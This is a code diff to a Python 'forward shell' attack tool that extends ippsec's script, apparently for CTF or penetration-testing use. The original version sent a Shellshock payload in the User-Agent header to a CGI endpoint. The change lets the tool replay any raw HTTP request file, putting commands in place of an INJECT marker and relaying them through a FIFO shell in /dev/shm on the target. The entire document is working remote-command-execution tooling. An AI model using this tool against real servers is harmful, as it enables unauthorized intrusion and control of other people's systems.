@@ -12,18 +12,39 @@ import requests
 import threading
 import time
 
+# all purpose mod imports
+import argparse
+import email # to read raw HTTP request
+from io import StringIO
+import json
+
 class WebShell(object):
 
+    # Setup argparser
+    parser = argparse.ArgumentParser(
+            prog="Forward Shell",
+            description="An all purpose expansion over ippsec's forward shell script")
+    parser.add_argument('-r', '--request', required=True) # request file to read from
+    parser.add_argument('-i', '--interval', type=float, required=True) # interval between every read request
+    parser.add_argument('-p', '--proxy', required=False) # proxy for debugging
+
     # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
-    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
+    def __init__(self):
+        
+        # Get all arguments
+        args = self.parser.parse_args()
+        
+        # Read request file
+        self.request_object = self.ReadHttpRaw(args.request)
+
         # MODIFY THIS, URL
-        self.url = r"http://10.10.10.56/cgi-bin/cat"
-        self.proxies = {'http' : proxies}
+        # self.url = r"http://192.168.0.108/webshell.php"
+        self.proxies = {'http' : args.proxy}
         session = random.randrange(10000,99999)
         print(f"[*] Session ID: {session}")
         self.stdin = f'/dev/shm/input.{session}'
         self.stdout = f'/dev/shm/output.{session}'
-        self.interval = interval
+        self.interval = args.interval
 
         # set up shell
         print("[*] Setting up fifo shell on target")
@@ -32,10 +53,45 @@ class WebShell(object):
 
         # set up read thread
         print("[*] Setting up read thread")
-        self.interval = interval
+        interval = args.interval
         thread = threading.Thread(target=self.ReadThread, args=())
         thread.daemon = True
         thread.start()
+
+    # Read raw HTTP request
+    def ReadHttpRaw(self, requestFile):
+        request_object = {'request_line': {}}
+        with open(requestFile, 'r') as f:
+            raw_request = [i.strip('\n') for i in f.readlines()]
+            request_line, headers, body = raw_request[0], raw_request[1:raw_request.index('')], raw_request[raw_request.index('')+1::]
+            
+            # convert requestline to list, to get verb, endpoint and http version
+            request_line = request_line.split(" ")
+            request_object['request_line']['verb'] = request_line[0]
+            request_object['request_line']['endpoint'] = request_line[1]
+            request_object['request_line']['version'] = request_line[2]
+            
+            # convert headers to a nice dict, https://stackoverflow.com/questions/39090366/how-to-parse-raw-http-request-in-python-3
+            raw_headers = "\r\n".join(headers)
+            message = email.message_from_file(StringIO(raw_headers))
+            headers = dict(message.items())
+            request_object['headers'] = headers
+
+            # convert body to data dict if body exists, ie request is not get
+            if request_object['request_line']['verb'] != 'GET':
+                better_body = []
+                for content in body:
+                    try:
+                        content = content.split('&')
+                    except:
+                        content = list(contnent)
+                    content = [i.split('=') for i in content]
+                    for i in content:
+                        better_body.append(i)
+
+                request_object['data'] = dict(better_body)
+
+        return request_object
 
     # Read $session, output text to screen & wipe session
     def ReadThread(self):
@@ -44,28 +100,30 @@ class WebShell(object):
             result = self.RunRawCmd(GetOutput) #, proxy=None)
             if result:
                 print(result)
-                ClearOutput = f'echo -n "" > {self.stdout}'
+                ClearOutput = f"echo -n '' > {self.stdout}"
                 self.RunRawCmd(ClearOutput)
             time.sleep(self.interval)
         
     # Execute Command.
-    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
+    def RunRawCmd(self, cmd, timeout=50):
         #print(f"Going to run cmd: {cmd}")
         # MODIFY THIS: This is where your payload code goes
         payload = cmd
-
-        if proxy:
+        attack_object = json.dumps(self.request_object)
+        attack_object = attack_object.replace('INJECT', payload)
+        attack_object = json.loads(attack_object)
+        
+        if self.proxies:
             proxies = self.proxies
         else:
             proxies = {}
-       
-        # MODIFY THIS: Payload in User-Agent because it was used in ShellShock
-        headers = {'User-Agent': payload}
+         
         try:
-            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
+            r = requests.request(attack_object['request_line']['verb'], "http://"+attack_object['headers']['Host']+attack_object['request_line']['endpoint'], headers=attack_object['headers'], data=attack_object['data'], proxies=self.proxies, timeout=timeout)
+
             return r.text
-        except:
-            pass
+        except Exception as e:
+            print("[!] Error: "+str(e))
             
     # Send b64'd command to RunRawCommand
     def WriteCmd(self, cmd):
@@ -84,7 +142,7 @@ S = WebShell()
 while True:
     cmd = input(prompt)
     if cmd == "upgrade":
-        prompt = ""
+        prompt = "\b"
         S.UpgradeShell()
     else:
         S.WriteCmd(cmd)
